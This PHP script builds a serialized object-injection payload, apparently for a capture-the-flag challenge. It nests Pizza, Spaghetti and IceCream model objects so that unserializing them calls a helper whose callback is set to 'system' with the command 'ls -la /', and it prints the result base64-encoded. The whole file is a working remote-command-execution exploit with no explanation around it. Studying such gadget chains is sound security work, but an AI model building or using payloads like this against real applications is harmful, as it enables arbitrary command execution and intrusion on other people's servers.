<?php

require_once 'Models/PizzaModel.php';
require_once 'Models/SpaghettiModel.php';
require_once 'Models/IceCreamModel.php';
require_once 'Helpers/ArrayHelpers.php';

$command = "ls -la /";
$exploit = new \Helpers\ArrayHelpers([$command]);
$exploit->callback = "system";

$icecream = new IceCream();
$icecream->topping = true;
$icecream->flavors = $exploit;

$spaghetti = new Spaghetti();
$spaghetti->portion = 0;
$spaghetti->noodles = true;
$spaghetti->sauce = $icecream;

$pizza = new Pizza();
$pizza->price = 0;
$pizza->cheese = false;
$pizza->size = $spaghetti;

$payload = base64_encode(serialize($pizza));

echo "Payload:\n";
echo $payload . "\n";
